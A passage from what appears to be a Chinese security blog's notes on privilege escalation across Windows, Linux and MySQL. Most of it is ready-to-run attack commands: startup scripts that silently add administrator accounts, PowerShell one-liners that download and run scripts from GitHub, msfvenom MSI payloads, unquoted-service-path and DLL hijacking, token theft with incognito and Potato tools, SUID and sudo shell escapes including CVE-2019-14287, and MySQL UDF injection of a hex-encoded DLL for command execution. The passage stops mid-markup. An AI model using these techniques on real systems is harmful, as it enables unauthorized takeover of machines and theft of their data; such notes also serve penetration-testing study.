    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>权限提升</title>
    <link href="/2022/03/27/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <url>/2022/03/27/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p><strong>Windows上常见的权限分类：</strong></p><blockquote><p>User：普通用户权限；</p><p>Administrator：管理员权限；</p><p>System：系统权限。</p><p>TrustedInstaller ： windows中最高权限。对系统文件，system 权限也无法修改，只有 TrustedInstaller 权限才能修改。</p></blockquote><p><strong>Linux上权限分类：</strong></p><blockquote><p>User：普通用户权限；</p><p>www-data：Web服务的权限，比User还要低，一般通过Web漏洞获取的Webshell就是这个权限；</p><p>root：Linux系统最高权限。</p></blockquote><p><strong>纵向提权</strong>：低权限角色获取高权限角色的权限。</p><p><strong>横向提权</strong>：在系统A中获取了系统B中同级别的角色权限。</p><h2 id="Win"><a href="#Win" class="headerlink" title="Win"></a>Win</h2><h3 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h3><blockquote><p>systeminfo &gt; 1.txt</p></blockquote><p>寻找未打补丁</p><ul><li><p>在线查询：<a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p></li><li><p>脚本+表格匹配：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></li></ul><blockquote><p>python windows-exploit-suggester.py -d xxx-mssb.xls -i 1.txt</p></blockquote><ul><li>ps脚本：<a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a></li></ul><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//本地加载<br>Import-Module .\Sherlock.ps1<br><br>//远程加载<br>IEX (New-Object  System.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>Find-AllVuls</p></blockquote><ul><li>MSF模块：<code>post/multi/recon/local_exploit_suggester</code>或者<code>post/windows/gather/enum_patches</code>可以快速检测到系统中可利用的漏洞</li></ul><blockquote><p>msf</p><p>search suggester</p><p>use 0</p><p>set session 1</p><p>run</p></blockquote><h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><ol><li><p>启动项路径：<br> C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p></li><li><p>在启动项中创建vbs或bat脚本</p></li></ol><blockquote><p>vbs：<br>  set wshshell=createobject(“wscript.shell”)<br>  a=wshshell.run(“cmd.exe /c net user 用户名 密码  /add”,0)<br>  b=wshshell.run(“cmd.exe /c net localgroup administrators 用户名 /add”,0)<br>bat：<br> net user 用户名 密码 /add<br> net localgroup administrators 用户名 /add</p></blockquote><ol start="3"><li><p>接下来需要等待机器重启并以较大权限的账号登录，暴力一点可以配合漏洞打蓝屏poc强制重启。</p></li><li><p>bat脚本运行时会有个dos弹一下，vbs不会弹，建议使用vbs脚本</p></li></ol><h3 id="系统错误配置提权"><a href="#系统错误配置提权" class="headerlink" title="系统错误配置提权"></a>系统错误配置提权</h3><p>windwos系统服务文件在操作系统启动时加载和执行，并在后台调用执行文件。因此，如果一个低权限用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p><p>windwos服务是以 system 权限运行的，因此，其文件夹、文件和注册表键值都是受强访问机制保护的。但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。</p><p>系统服务权限配置错误(可写目录漏洞)有如下两种可能：</p><ol><li><p>服务未运行：攻击者会使用任意服务替换原来的服务，然后重启服务</p></li><li><p>服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用 DLL 劫持技术并尝试重启服务来提权。</p></li></ol><ul><li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUP</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass -Command <span class="hljs-string">&quot;&amp; &#123;Import-Module c:\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br><br>powershell.exe -nop -<span class="hljs-built_in">exec</span> bypass -c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure><ul><li>MSF中的<code>exploit/windows/local/service_permissions</code>服务提权模块可以返回一个system权限</li></ul><blockquote><p>set SESSION</p><p>run</p></blockquote><p>模块使用两种方法获得system权限：如果meterpreter以管理员权限运行，该模块尝试创建并运行一个新的服务，如果当前权限不允许创建服务，该模块会判断哪些服务或者文件夹的权限有问题，并对其进行劫持。在创建服务或者劫持已经存在的服务时，该模块会创建一个可执行文件 ，文件名和安装路径随机</p><ul><li>注册表键AlwayslnstallElevated</li></ul><p><code>注册表键AlwayslnstallElevated</code>是一个策略设置项。Windows允许低权限用户以syetem权限运行安装文件。如果启动此策略设置项，那么任何权限的用户都能以<code>NT AUTHORITY\SYSTEM</code>权限来安装恶意的MSI文件</p><p>使用PowerUP的<code>Get-RegistryAlwaysInstallElevated</code>模块来检测注册表是否被设置。如果 AlwaysInstallElevated 注册表项被设置，意味着的 MSI 文件是以 system 权限运行的，True 表示已经设置，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -nop -<span class="hljs-built_in">exec</span> bypass IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;C:\Users\Admin\Desktop\PowerUp\PowerUp\PowerUp.ps1&#x27;</span>);Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>也可用注册表查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>生成恶意的MSI安装文件，让其来添加用户，使用<code>PowerUp</code>脚本自带的 <code>Write-UserAddMSI</code>模块，运行后生成文件 <code>UserAdd.msi</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -nop -<span class="hljs-built_in">exec</span> bypass IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;C:\Users\Admin\Desktop\PowerUp\PowerUp\PowerUp.ps1&#x27;</span>);Write-UserAddMSI<br></code></pre></td></tr></table></figure><p>以普通权限运行UserAdd.msi，下面这个运行后还需要点击Greate，更方便的是直接在桌面上进行双击确定,成功添加用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q /i UserAdd.msi<br></code></pre></td></tr></table></figure><p>另外的方式是可以使用msf生成木马，进行上传运行，实战记得免杀</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -f msi -p windows/adduser USER=qing PASS=123P@ss! -o /root/msi.msi<br>upload /root/msi.msi c:\\msi.msi <br></code></pre></td></tr></table></figure><p>msiexec工具参数：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/quiet</span>:在安装过程中禁止向用户发送消息<br><span class="hljs-string">/qn</span>:不实用图形界面<br><span class="hljs-string">/i</span>:安装程序<br></code></pre></td></tr></table></figure><p>也可利用metasploit的<code>exploit/windows/local/always_install_elevated</code>模块完成以上的操作，会返回一个system权限的mterpreter。这个模块会创建一个文件名随机的MSI文件，提权后自动删除已部署的文件。</p><ul><li>可信任服务路径漏洞</li></ul><p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的。</p><p>原理：对于C:\Program Files\Some Folder\Service.exe文件路径中的每一个空格，windows都会尝试寻找并执行名字与空格前的名字向匹配的程序。操作系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。以上面的例子为例，windows会依次尝试确定和执行下面的程序：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\Program.exe</span><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Some.exe</span><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Some</span> Folder<span class="hljs-string">\Service.exe</span><br></code></pre></td></tr></table></figure><p>所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，比如这里我把木马名字改了Program.exe，放在c盘小,一旦此服务重启，因为优先级的缘故，服务会优先选择我们木马Program.exe，而不是C:\Program Files\Some Folder\Service.exe，那么我们的恶意程序就会以system权限运行(大多数情况下)。</p><p>该漏洞存在如下两种可能性：</p><ol><li><p>如果路径与服务有关，就任意创建一个服务或者编译Serviec模版</p></li><li><p>如果路径与可执行文件有关，就任意创建一个可执行文件</p></li></ol><p>检测使用wmic命令，列出目标机器中所有没有被引号引起来的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>通过显示出来的服务路径有没有被引号引起来，且路径是否包含空格来判断目标机器上是否存在可信任服务路径漏洞。</p><ul><li><input checked="" disabled="" type="checkbox"> 手动写入</li></ul><p>下一步是检测目标文件是否有写权限。可使用Windows内置工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;路径&quot;</span><br>accesschk -dqv <span class="hljs-string">&quot;路径&quot;</span> -accepteula<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Everyone:用户对这个文件夹有完全控制权限</span><br><span class="hljs-section">（M）:修改</span><br><span class="hljs-section">（F）: 完全控制</span><br><span class="hljs-section">（CI）: 从属容器将继承访问控制项</span><br><span class="hljs-section">（OI）:从属文件将继承访问控制项</span><br><span class="hljs-section">Everyone:(OI)(CI)(F)意思是对该文件夹，用户有读写、删除其下文件、删除其子目录的权限</span><br></code></pre></td></tr></table></figure><p>确认漏洞后，要上传的程序<code>重命名</code>并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc stop service_name<br>sc start service_name<br></code></pre></td></tr></table></figure><ul><li><input checked="" disabled="" type="checkbox"> 使用msf</li></ul><blockquote><p>use exploit/windows/local/trust_service_path</p><p>set AutoRunScript migrate -f</p></blockquote><ul><li>自动安装配置文件</li></ul><p><code>post/windows/gather/enum_unattend</code>会遍历inf、xml等文件获取账号密码</p><ul><li>计划任务</li></ul><p>域渗透的时候可以关注一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><h3 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h3><p>在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便管理，管理员往往会使用域策略进行统一的配置和管理。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码</p><p>就算如此，安全问题依旧存在。通过组策略统一修改的密码，虽然强度有所提高，但所有机器的本地管理员密码是相同的。在通过一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码</p><p>常见的组策略首选项（Group Policy Preferences）列举如下：</p><ol><li>映射驱动器（Drives.xml）</li><li>创建本地用户</li><li>数据源(DataSources.xml)</li><li>打印机配置(Printers.xml)</li><li>创建/更新服务(Services.xml)</li><li>计划任务(ScheduledTasks.xml)</li></ol><p><code>SYSVOL</code>是活动后目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。SYSVOL在所有经过身份验证的域用户或者域信任用户具有读写权限的活动目录的域范围内共享。整个SYSVOL目录所在的域控制器中是自动同步和共享的，所有的策略均存放在<code>C:\Windows\SYSVOL\DOMAIN\Policies</code>目录中</p><h3 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h3><p>UAC是为微软为提高系统安全性在Windows  Vista中引入的技术。UAC的要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上安装操作或者对计算机设置进行更改。</p><p>在Windows Vista及更高版本的操作系统中，微软设置了安全控制策略，分为<code>高、中、低</code>三个等级。高等级的进程有<code>管理员权限</code>；中等级的进程有<code>普通用户权限</code>；低等级的进程，权限是有限的，以保证在收到安全威胁时造成的损害最小。</p><p>需要UAC的授权才能进行的操作列表如下</p><ol><li>配置Windows Update</li><li>增加/删除账户</li><li>更改账户类型</li><li>更改UAC的设置</li><li>安装ActiveX</li><li>安装/卸载程序</li><li>安装设备驱动程序</li><li>将文件移动/入职到Program Files 或windows等目录下</li><li>查看其他用户的文件夹</li></ol><p>UAC有如下四种设置要求</p><ol><li>始终通知：这是最安全的设置，没当有程序需要使用高级别的权限时都会提示本地用户</li><li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</li><li>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</li><li>从不提示：当用户为管理员时，所有程序会以最高权限运行</li></ol><p>bypassuac模块：</p><ul><li>exploit/windows/local/bypassuac模块</li><li>exploit/windows/local/bypassuac_injection模块</li><li>exploit/windows/local/ask模块 需要管理员权限进行交互</li></ul><h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p><code>令牌（Token）</code>是指系统中的临时密钥，相当于账号和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。令牌将持续存在于系统中，除非系统重新启动</p><p>令牌的最大特点是随机性和不可预测性。<code>访问令牌（Access Token）</code>代表访问控制操作主题的系统对象。<code>密保令牌（Security Token）</code>也叫作认证令牌或者硬件令牌，是一种实现计算机身份校验的物理设备，入U盾。<code>会话令牌（Session Token）</code>是交互会话中唯一的身份标识符</p><p>伪造令牌的攻击的核心是<code>kerberos</code>协议。kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认真服务</p><p>有两种类型的令牌：一种是<code>Delegation Tokens</code>是为授权令牌，支持交互式的登录，如可远程登录访问等；另一种是<code>Impersonation Tokens</code>是模拟令牌，支持非交互式的会话。令牌的数量取决于meterpreter shell的访问级别。如果是一个系统管理员的令牌，则可以直接伪造这个令牌，使攻击者拥有它的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">list_tokens -u                           //列出令牌<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span> //窃取令牌<br>steal_token 1234                         //从进程窃取令牌<br>rev2self                                 //返回到之前的AccessToken权限<br></code></pre></td></tr></table></figure><p>有独立的可执行<a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">文件</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">incognito.exe list_tokens -u                            //列举令牌<br>incognito.exe execute -c <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe  //窃取令牌执行cmd.exe，此时可以配合木马<br></code></pre></td></tr></table></figure><ul><li>窃取TrustedInstaller令牌</li></ul><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc.exe start TrustedInstaller<br></code></pre></td></tr></table></figure><p>窃取令牌</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use incognito<br>ps                    //找到TrustedInstaller的进程PID<br>steal_token 1234      //从该进程中窃取令牌<br>getuid   <br></code></pre></td></tr></table></figure><ul><li>配合烂土豆</li></ul><p>C#版的烂土豆（来自QAX零队） </p><p>实测Win7、Win8、08、12等可用</p><p>项目地址：<a href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p><p>直接在Webshell下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SweetPotato.exe -a whoami<br></code></pre></td></tr></table></figure><p>其他的版本：</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></p><p>上传potato</p><blockquote><p>execute -cH -f potato.exe<br>impersonate_token “NT AUTHORITY\SYSTEM”</p></blockquote><p><a href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a>  //需要编译</p><p><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a>  </p><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><blockquote><p>C:\Windows\System32<br>C:\Windows\System<br>C:\Windows<br>当前工作目录Current Working Directory，CWD<br>在PATH环境变量的目录（先系统后用户）</p></blockquote><p>收集进程加载了哪些dll，可以上传单机版的火绒剑，进程里面系统文件没有权限无法更改，选择数字签名文件或未知文件，msf生成木马dll进行替换</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="内核溢出漏洞提权-1"><a href="#内核溢出漏洞提权-1" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h3><blockquote><p>uname -a</p><p>hostnamectl</p><p>lsb_release -a</p></blockquote><p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p><p><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p><a href="https://github.com/SecWiki/macos-kernel-exploits">mac</a></p><h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><blockquote><p>crontab -l //列出定时任务</p><p>//查看定时任务</p><p>/etc/crontab</p><p>/var/spool/cron/crontabs</p><p>/etc/cron.*/</p></blockquote><ol><li>定时任务以root或高权限用户运行</li><li>拿到的低权限用户对定时文件有写文件的权限</li></ol><p>然后步骤就是写进定时任务，反弹shell等</p><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p><a href="https://blog.csdn.net/shuteer_xu/article/details/104912790?utm_term=SUID%E6%8F%90%E6%9D%83%20%E5%88%A9%E7%94%A8%E5%A4%B1%E8%B4%A5&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-104912790&spm=3001.4430">具体</a></p><p>SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行，ls 查看时有 s 属性才支持 SUID</p><p>查找系统中可使用root权限运行的命令：</p><blockquote><p> find / -user root -perm -4000 -print 2&gt;/dev/null<br> find / -perm -u=s -type f 2&gt;/dev/null<br> find / -user root -perm -4000 -exec ls -ldb {} ;</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">perm 表示搜索随后的权限</span><br><span class="ruby"></span>-<span class="ruby">u = s表示查找root用户拥有的文件</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-string">``</span>type<span class="hljs-string">``</span>表示我们正在寻找的文件类型</span><br><span class="ruby"></span>f 表示常规文件，而不是目录或特殊文件<br>2表示该进程的第二个文件描述符，即stderr（标准错误）<br></code></pre></td></tr></table></figure></blockquote><p>常用的命令并且可能具有<strong>S</strong>权限有：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span><br><span class="hljs-keyword">vim</span><br><span class="hljs-keyword">find</span><br>bash<br>more<br>less<br>nano<br><span class="hljs-keyword">cp</span><br>awk<br></code></pre></td></tr></table></figure><p>利用方式：</p><blockquote><p>Nmap(2.02-5.21)<br> nmap –interactive<br> !sh</p><p>find<br> touch pentestlab<br> find pentestlab -exec whoami ;</p><p>less/more<br> less(more) /etc/passwd<br> !/bin/sh</p><p>vim/vi<br> vim.tiny<br> :set shell=/bin/sh<br> :shell</p><p>git<br> git help config<br> !/bin/bash</p></blockquote><h3 id="sudo权限绕过"><a href="#sudo权限绕过" class="headerlink" title="sudo权限绕过"></a>sudo权限绕过</h3><p>cve-2019-14287，sudo &lt; 1.8.28</p><blockquote><p>sudo -l</p><p>sudo awk ‘BEGIN{system(“/bin/sh”)}’</p><p>sudo curl file:///etc/shadow</p><p><strong>sudo -u#-1whoami</strong></p></blockquote><h3 id="su-root被禁止登录（获取交互shell）"><a href="#su-root被禁止登录（获取交互shell）" class="headerlink" title="su root被禁止登录（获取交互shell）"></a>su root被禁止登录（获取交互shell）</h3><blockquote><p>拿到 root 密码，端口转发，代理，但防火墙禁止其他人登录 root；</p><p>用原来的低权限 shell，也无法 sudo 切换 root</p><p>因为出于安全考虑，linux 要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）</p><p>所以 sudo 在你输入密码的时候本质上是读取了键盘，而不是读取 bash 里面输入的字符</p></blockquote><p>利用python获取交互Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br>sudo su<br></code></pre></td></tr></table></figure><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样</p><p><strong>条件：</strong></p><blockquote><p>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/，该目录默认不存在，需要创建后上传udf.dll</p><p>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</p><p>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数</p><p>拥有可以将udf.dll写入相应目录的权限</p></blockquote><p><strong>利用：</strong></p><p>mysql内查找插件安装目录：</p><blockquote><p>show variables like %plugin%</p></blockquote><p>目录是否可写：</p><blockquote><p>show variables like ‘%secure_file_priv%’</p></blockquote><p>udf.dll文件可以在sqlmap里面找：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330184744211.png"></p><p>sqlmap中的udf.dll经过异或编码，需要解码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330210702070.png"></p><blockquote><p>python3 cloak.py -d -i lib_mysqludf_sys.dll</p></blockquote><p>将解码后的dll文件复制到<code>mysql/lib/plugin</code></p><p>创建函数：</p><blockquote><p>create function sys_exec returns string soname “lib_mysqludf_sys.dll”;</p><p>create function sys_eval returns string soname “lib_mysqludf_sys.dll”;</p></blockquote><p>其他可用函数如下：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330211359783.png"></p><p>利用：</p><blockquote><p>select sys_exec(‘whoami’);</p><p>select sys_eval(‘whoami’);</p></blockquote><p>删除函数：</p><blockquote><p>DROP function sys_exec;</p><p>DROP function sys_eval;</p></blockquote><p>linux对应的是so文件</p><p>这些dll/so文件还可以在Metasploit的/usr/share/metasploit-framework/data/exploits/mysql目录下找到</p><ul><li>数据流写入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">create table temp(data longblob);<br>insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);<br>update temp <span class="hljs-built_in">set</span> data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);<br>select data from temp into dumpfile <span class="hljs-string">&quot;G:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;</span>;<br>create <span class="hljs-keyword">function</span> sys_eval returns string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;   <span class="hljs-comment">#创建函数sys_eval</span><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_36119192/article/details/84863268">详情</a></p><ul><li>使用MSF中的<code>exploit/multi/mysql/mysql_udf_payload</code>模块也可以进行UDF提权，但是前提是可以使用账号密码进入mysql以及存在对应目录，msf创建的UDF函数默认是<code>sys_exec()</code>没有回显，如下创建<code>sys_eval()</code></li></ul><blockquote><p>select * from mysql.func where name = “sys_eval”;</p><p>create function sys_eval retuns string soname “xxx.dll”;</p></blockquote><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p>比较老了，权当了解学习：<a href="https://www.cnblogs.com/zzjdbk/p/12991468.html">参考</a></p><p>MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）</p><p>叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡</p><blockquote><p>MOF文件既然每五秒就会执行，而且是系统权限；</p><p>我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；</p><p>然后系统每隔五秒就会执行一次我们上传的MOF。</p><p>MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p></blockquote><p>这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到，而且较新的系统无法使用MOF提权。</p><p><strong>条件：</strong></p><blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Windows</span>&lt;=<span class="hljs-number">2003</span><br></code></pre></td></tr></table></figure><p>mysql在c:/windows/system32/wbem/mof目录有写权限</p><p>已知数据库root账号密码</p><p>数据库允许外连</p><p>secure_file_priv为空</p></blockquote><p>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>MySQL</code>的导入|导出做限制，如果是null，表示<code>MySQL</code>不允许导入导出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 